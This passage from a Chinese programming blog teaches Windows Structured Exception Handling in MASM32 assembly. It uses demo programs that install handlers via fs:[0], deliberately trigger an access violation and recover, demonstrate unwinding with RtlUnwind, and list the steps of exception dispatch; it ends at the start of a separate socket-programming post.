<p>卸载就是把esp赋值为刚刚存入<code>fs:[0]</code>的（像上图的右下角的那个<code>_EXCEPTION_REGISTRATION_RECORD</code>的next的地址）,然后pop一下保证栈帧平衡。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">.386</span>		;使用<span class="number">80386</span>处理器指令集</span><br><span class="line">.model flat,stdcall		;用来定义程序工作的模式，flat:内存模式，stdcall:语言模式</span><br><span class="line">option casemap:none		;是否对变量与子程序名大小写敏感，必须要进行设置</span><br><span class="line">	</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line"></span><br><span class="line">.<span class="type">const</span> </span><br><span class="line">	msg db <span class="string">&#x27;异常发生的位置:%08x,异常代码:%08x,异常标志:%08x&#x27;</span>,<span class="number">0</span></span><br><span class="line">	safe db <span class="string">&#x27;转到安全的地方执行&#x27;</span>,<span class="number">0</span></span><br><span class="line">	caption db <span class="string">&#x27;标题aa&#x27;</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">	_Handle proc _lpExceptionRecord, _lp_SEH, _lpContext, _lpDispatcherContext</span><br><span class="line">		; loacl 定义局部变量</span><br><span class="line">		local szBuffer[<span class="number">256</span>]:byte</span><br><span class="line">		pushad</span><br><span class="line">			mov esi,_lpExceptionRecord</span><br><span class="line">			mov edi,_lpContext</span><br><span class="line">			;关联起来</span><br><span class="line">			assume esi:ptr EXCEPTION_RECORD, edi:ptr CONTEXT</span><br><span class="line"></span><br><span class="line">			;eip 要用 regEip</span><br><span class="line">			invoke wsprintf, addr szBuffer, addr msg, [edi].regEip, [esi].ExceptionCode, [esi].ExceptionFlags</span><br><span class="line">			invoke MessageBox, <span class="number">0</span>, addr szBuffer , addr caption, MB_OK</span><br><span class="line"></span><br><span class="line">			;调用</span><br><span class="line">			mov [edi].regEip, offset safefn</span><br><span class="line">			;调用完释放掉</span><br><span class="line">			assume esi:nothing, edi:nothing</span><br><span class="line"></span><br><span class="line">		popad</span><br><span class="line">			;正常执行</span><br><span class="line">			mov eax, EXCEPTION_CONTINUE_EXECUTION</span><br><span class="line">		ret</span><br><span class="line">	_Handle endp</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	;安装seh 在栈中构造一个EXCEPTION_REGISTRATION结构体</span><br><span class="line">	assume fs:nothing		;启用fs寄存器</span><br><span class="line">	push offset _Handle</span><br><span class="line">	push fs:[<span class="number">0</span>]</span><br><span class="line">	mov  fs:[<span class="number">0</span>], esp</span><br><span class="line"></span><br><span class="line">	;触发异常</span><br><span class="line">	xor eax, eax</span><br><span class="line">	mov dword ptr [eax],<span class="number">0</span> ;产生访问异常</span><br><span class="line">	;</span><br><span class="line">	;如果这里有指令 不会执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">safefn:</span><br><span class="line">	invoke MessageBox, <span class="number">0</span>, addr safe, addr caption, MB_OK</span><br><span class="line"></span><br><span class="line">	;卸载seh  把结构体pop出来</span><br><span class="line">	pop fs:[<span class="number">0</span>]</span><br><span class="line">	pop eax</span><br><span class="line">	invoke ExitProcess, <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>编译后运行</p>
<p><img src="/posts/a3f022ab/10-7.png" alt="img"></p>
<p>会先产生一个 c0000005的异常</p>
<p>然后会在产生一个异常c0000026（看发生位置应该是内核中的） 标志00000001 表示程序不可恢复执行（前面在编写汇编时使用了<code>EXCEPTION_CONTINUE_EXECUTION</code>）没有成功跳到正常执行的地方</p>
<p><img src="/posts/a3f022ab/10-8.png" alt="img"></p>
<hr>
<p>这里先用给的demo进行编译演示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		<span class="number">.386</span></span><br><span class="line">		.model flat,stdcall</span><br><span class="line">		option casemap:none</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Include 文件定义</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 数据段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		.<span class="type">const</span></span><br><span class="line">szMsg		db	<span class="string">&#x27;异常发生位置：%08X，异常代码：%08X，标志：%08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szSafe		db	<span class="string">&#x27;回到了安全的地方!&#x27;</span>,<span class="number">0</span></span><br><span class="line">szCaption	db	<span class="string">&#x27;SEH例子&#x27;</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">		.code</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 错误 Handler</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Handler	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext</span><br><span class="line">		local	@szBuffer[<span class="number">256</span>]:byte</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		mov	esi,_lpExceptionRecord</span><br><span class="line">		mov	edi,_lpContext</span><br><span class="line">		assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szMsg,\</span><br><span class="line">			[edi].regEip,[esi].ExceptionCode,[esi].ExceptionFlags</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,<span class="literal">NULL</span>,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">; 将 EIP 指向安全的位置并恢复堆栈</span><br><span class="line">;********************************************************************</span><br><span class="line">		mov	eax,_lpSEH</span><br><span class="line">		push	[eax + <span class="number">8</span>]</span><br><span class="line">		pop	[edi].regEip</span><br><span class="line">		push	[eax + <span class="number">0</span>ch]</span><br><span class="line">		pop	[edi].regEbp</span><br><span class="line">		push	eax</span><br><span class="line">		pop	[edi].regEsp</span><br><span class="line">		assume	esi:nothing,edi:nothing</span><br><span class="line">		popad</span><br><span class="line">		mov	eax,ExceptionContinueExecution</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Handler	endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Test		proc</span><br><span class="line"></span><br><span class="line">;********************************************************************</span><br><span class="line">; 在堆栈中构造一个 EXCEPTION_REGISTRATION 结构</span><br><span class="line">;********************************************************************</span><br><span class="line">		assume	fs:nothing</span><br><span class="line">		push	ebp</span><br><span class="line">		push	offset _SafePlace</span><br><span class="line">		push	offset _Handler</span><br><span class="line">		push	fs:[<span class="number">0</span>]</span><br><span class="line">		mov	fs:[<span class="number">0</span>],esp</span><br><span class="line">;********************************************************************</span><br><span class="line">; 会引发异常的指令</span><br><span class="line">;********************************************************************</span><br><span class="line">		pushad</span><br><span class="line">		xor	ebp,ebp</span><br><span class="line">		xor	eax,eax</span><br><span class="line">		mov	dword ptr [eax],<span class="number">0</span></span><br><span class="line">		popad		;这一句将无法被执行</span><br><span class="line">_SafePlace:</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr szSafe,addr szCaption,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">; 恢复原来的 SEH 链</span><br><span class="line">;********************************************************************</span><br><span class="line">		pop	fs:[<span class="number">0</span>]</span><br><span class="line">		add	esp,<span class="number">0</span>ch</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Test		endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">start:</span><br><span class="line">		invoke	_Test</span><br><span class="line">		invoke	ExitProcess,<span class="literal">NULL</span></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		end	start</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-9.png" alt="img"></p>
<p><img src="/posts/a3f022ab/10-10.png" alt="img"></p>
<p>(1）系统查看产生异常的进程是否正在被调试，如果正在被调试的话，那么向调试器发送EXCEPTION_DEBUG_EVENT事件。</p>
<p>(2）如果进程没有被调试或者调试器不去处理这个异常，那么系统检查异常所处的线程，并在这个线程的环境中查看fs:[0]来确定是否安装有SEH 异常处理回调函数，如果有的话则调用它。</p>
<p>(3）回调函数尝试处理这个异常，如果可以正确处理的话，则修正错误并将返回值设置为ExceptionContinueExecution，这时系统将结束整个查找过程。</p>
<p>(4）如果回调函数返回ExceptionContinueSearch，告知系统它无法处理这个异常，那么系统将根据SEH 链中的 prev字段得到上一个回调函数地址并重复步骤（3)，直到链中的某个回调函数返回ExceptionContinueExecution为止，查找结束。</p>
<p>(5）如果到了SEH链的尾部却没有一个回调函数愿意处理这个异常，那么系统将再次检测进程是否正在被调试，如果被调试的话，则再一次通知调试器。</p>
<p>(6）如果调试器还是不去处理这个异常或者进程没有被调试，那么系统检查有没有安装筛选器回调函数，如果有，则去调用它，筛选器回调函数返回时，系统默认的异常处理程序根据这个返回值将做相应的动作。</p>
<p>(7）如果没有安装筛选器回调函数，系统直接调用默认的异常处理程序终止进程。</p>
<hr>
<h4 id="SEH展开操作"><a href="#SEH展开操作" class="headerlink" title="SEH展开操作"></a>SEH展开操作</h4><p><img src="/posts/a3f022ab/10-11.png" alt="img"></p>
<p>展开操作demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">		<span class="number">.386</span></span><br><span class="line">		.model flat,stdcall</span><br><span class="line">		option casemap:none</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; Include 文件定义</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 数据段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		.data</span><br><span class="line">szMsg1		db	<span class="string">&#x27;这是外层异常处理程序（将处理异常）&#x27;</span>,<span class="number">0</span>dh,<span class="number">0</span>ah</span><br><span class="line">		db	<span class="string">&#x27;异常发生位置：%08X，异常代码：%08X，标志：%08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szMsg2		db	<span class="string">&#x27;这是内层异常处理程序（对异常不进行处理）&#x27;</span>,<span class="number">0</span>dh,<span class="number">0</span>ah</span><br><span class="line">		db	<span class="string">&#x27;异常发生位置：%08X，异常代码：%08X，标志：%08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szCaption	db	<span class="string">&#x27;提示信息&#x27;</span>,<span class="number">0</span></span><br><span class="line">szBeforeUnwind	db	<span class="string">&#x27;现在将开始 Unwind，当前的 FS:[0] = %08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szAfterUnwind	db	<span class="string">&#x27;Unwind 返回，当前的 FS:[0] = %08X&#x27;</span>,<span class="number">0</span></span><br><span class="line">szSafe1		db	<span class="string">&#x27;回到了外层子程序的安全位置!&#x27;</span>,<span class="number">0</span></span><br><span class="line">szSafe2		db	<span class="string">&#x27;回到了内层子程序的安全位置!&#x27;</span>,<span class="number">0</span></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 代码段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		.code</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 外层错误 Handler，将处理异常</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Handler1	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext</span><br><span class="line">		local	@szBuffer[<span class="number">256</span>]:byte</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		mov	esi,_lpExceptionRecord</span><br><span class="line">		mov	edi,_lpContext</span><br><span class="line">		assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT,fs:nothing</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szMsg1,\</span><br><span class="line">			[edi].regEip,[esi].ExceptionCode,[esi].ExceptionFlags</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,<span class="literal">NULL</span>,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">; 将 EIP 指向安全的位置并恢复堆栈</span><br><span class="line">;********************************************************************</span><br><span class="line">		mov	eax,_lpSEH</span><br><span class="line">		push	[eax + <span class="number">8</span>]</span><br><span class="line">		pop	[edi].regEip</span><br><span class="line">		push	_lpSEH</span><br><span class="line">		pop	[edi].regEsp</span><br><span class="line">;********************************************************************</span><br><span class="line">; 对前面的 Handler 进行 Unwind 操作</span><br><span class="line">;********************************************************************</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szBeforeUnwind,dword ptr fs:[<span class="number">0</span>]</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,addr szCaption,MB_OK</span><br><span class="line"></span><br><span class="line">		invoke	RtlUnwind,_lpSEH,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szAfterUnwind,dword ptr fs:[<span class="number">0</span>]</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,addr szCaption,MB_OK</span><br><span class="line">;********************************************************************</span><br><span class="line">		assume	esi:nothing,edi:nothing</span><br><span class="line">		popad</span><br><span class="line">		mov	eax,ExceptionContinueExecution</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Handler1	endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">; 内层错误 Handler，不处理异常</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Handler2	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext</span><br><span class="line">		local	@szBuffer[<span class="number">256</span>]:byte</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		mov	esi,_lpExceptionRecord</span><br><span class="line">		mov	edi,_lpContext</span><br><span class="line">		assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szMsg2,\</span><br><span class="line">			[edi].regEip,[esi].ExceptionCode,[esi].ExceptionFlags</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,<span class="literal">NULL</span>,MB_OK</span><br><span class="line">		assume	esi:nothing,edi:nothing</span><br><span class="line">		popad</span><br><span class="line">		mov	eax,ExceptionContinueSearch</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Handler2	endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Test2		proc</span><br><span class="line"></span><br><span class="line">		assume	fs:nothing</span><br><span class="line">		push	offset _SafePlace</span><br><span class="line">		push	offset _Handler2</span><br><span class="line">		push	fs:[<span class="number">0</span>]</span><br><span class="line">		mov	fs:[<span class="number">0</span>],esp</span><br><span class="line">;********************************************************************</span><br><span class="line">; 会引发异常的指令</span><br><span class="line">;********************************************************************</span><br><span class="line">		pushad</span><br><span class="line">		xor	eax,eax</span><br><span class="line">		mov	dword ptr [eax],<span class="number">0</span></span><br><span class="line">		popad		;这一句将无法被执行</span><br><span class="line">_SafePlace:</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr szSafe2,addr szCaption,MB_OK</span><br><span class="line">		pop	fs:[<span class="number">0</span>]</span><br><span class="line">		add	esp,<span class="number">8</span></span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Test2		endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Test1		proc</span><br><span class="line"></span><br><span class="line">		assume	fs:nothing</span><br><span class="line">		push	offset _SafePlace</span><br><span class="line">		push	offset _Handler1</span><br><span class="line">		push	fs:[<span class="number">0</span>]</span><br><span class="line">		mov	fs:[<span class="number">0</span>],esp</span><br><span class="line">		invoke	_Test2</span><br><span class="line">_SafePlace:</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr szSafe1,addr szCaption,MB_OK</span><br><span class="line">		pop	fs:[<span class="number">0</span>]</span><br><span class="line">		add	esp,<span class="number">8</span></span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Test1		endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">start:</span><br><span class="line">		invoke	_Test1</span><br><span class="line">		invoke	ExitProcess,<span class="literal">NULL</span></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		end	start</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-12.png" alt="img"> </p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/Rev-omi/p/13893547.html">https://www.cnblogs.com/Rev-omi/p/13893547.html</a></p>
<p><a href="https://bbs.pediy.com/thread-273332.htm#msg_header_h3_0">https://bbs.pediy.com/thread-273332.htm</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-09_socket编程</title>
    <url>/posts/3ced1fa4/</url>
    <content><![CDATA[<p>在网络上为大端存储</p>
<p>lpString </p>
<p>htons()–”Host to Network Short”</p>
<p>htonl()–”Host to Network Long”</p>
